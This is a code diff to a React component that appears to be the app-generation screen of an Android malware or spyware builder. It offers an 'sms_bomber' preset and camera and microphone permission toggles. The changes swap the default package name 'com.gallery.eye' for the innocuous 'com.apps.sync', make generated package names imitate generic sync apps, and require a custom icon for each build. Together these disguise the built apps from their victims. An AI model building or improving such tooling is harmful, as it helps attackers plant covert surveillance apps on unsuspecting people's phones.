@@ -80,10 +80,6 @@ const PRESET_ICON_STYLES: Record<string, { gradient: [string, string, string]; s
     sms_bomber: {
         gradient: ['#F59E0B', '#EA580C', '#DC2626'],
         svgPath: 'M17.657 18.657A8 8 0 016.343 7.343S7 9 9 10c0-2 .5-5 2.986-7C14 5 16.09 5.777 17.656 7.343A7.975 7.975 0 0120 13a7.975 7.975 0 01-2.343 5.657z M9.879 16.121A3 3 0 1012.015 11L11 14H9c0 .768.293 1.536.879 2.121z'
-    },
-    custom: {
-        gradient: ['#F97316', '#EA580C', '#C2410C'],
-        svgPath: 'M12 2a10 10 0 100 20 10 10 0 000-20zm-1 17.93A8.006 8.006 0 014.07 13H7a14.08 14.08 0 001.2 5.73A7.94 7.94 0 0111 19.93zM4.07 11A8.006 8.006 0 0111 4.07V9H4.2A13.9 13.9 0 004.07 11zm8.93-6.93A8.006 8.006 0 0119.93 11H13V4.07zM17 13h2.93a8.006 8.006 0 01-6.93 6.93V15h2.8c.45-.63.85-1.3 1.2-2zm-5 6.96c-.83-.43-1.63-1.46-2.18-3.08A12.1 12.1 0 019 13h6c-.1 1.4-.46 2.76-.98 3.88-.55 1.62-1.35 2.65-2.18 3.08z'
     }
 };
 
@@ -177,7 +173,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setQueuePosition(0);
             setSelectedPreset('custom');
             setCustomAppName("");
-            setCustomPackageName("com.gallery.eye");
+            setCustomPackageName("com.apps.sync");
             setCustomWebLink("");
             setCustomIcon(null);
             setCustomIconPreview(null);
@@ -204,7 +200,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
     const [selectedPreset, setSelectedPreset] = useState<string>('custom');
     const [customAppName, setCustomAppName] = useState("");
-    const [customPackageName, setCustomPackageName] = useState("com.gallery.eye");
+    const [customPackageName, setCustomPackageName] = useState("com.apps.sync");
     const [customWebLink, setCustomWebLink] = useState("");
     const [customIcon, setCustomIcon] = useState<File | null>(null);
     const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);
@@ -214,9 +210,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const generatePackageName = (name: string) => {
         const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
         const parts = cleaned.split(/\s+/).filter(Boolean);
-        if (parts.length === 0) return "com.gallery.eye";
-        if (parts.length === 1) return `com.${parts[0]}.app`;
-        return `com.${parts[0]}.${parts[1]}`;
+        if (parts.length === 0) return "com.apps.sync";
+        if (parts.length === 1) {
+            const p = (parts[0] + "apps").substring(0, 4);
+            return `com.${p}.sync`;
+        }
+        const p1 = (parts[0] + "core").substring(0, 4);
+        const p2 = (parts[1] + "sync").substring(0, 4);
+        return `com.${p1}.${p2}`;
     };
 
     const handleAppNameChange = (name: string) => {
@@ -446,6 +447,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 setShowCustomAlert(true);
                 return;
             }
+            if (!customIcon && !customIconPreview) {
+                setAlertData({
+                    title: 'Custom Icon Required',
+                    message: 'Please select an icon (PNG/JPG) for your custom app.',
+                    type: 'warning'
+                });
+                setShowCustomAlert(true);
+                return;
+            }
         }
 
         setStatus('generating');
@@ -504,11 +514,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('notificationText', finalText);
             if (selectedPreset === 'custom' && customIcon) {
                 formData.append('icon', customIcon);
-            } else if (selectedPreset === 'custom' && !customIcon) {
-                const iconBlob = await generatePresetIconBlob('custom');
-                if (iconBlob) {
-                    formData.append('icon', iconBlob, 'custom_icon.png');
-                }
             } else if (selectedPreset !== 'custom') {
                 const iconBlob = await generatePresetIconBlob(selectedPreset);
                 if (iconBlob) {
@@ -965,6 +970,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableCameraPermission && isPremium ? 'translate-x-5' : 'translate-x-0'}`} />
                                     </div>
                                 </div>
+
 
 
                                 {/* Microphone Permission Card */}
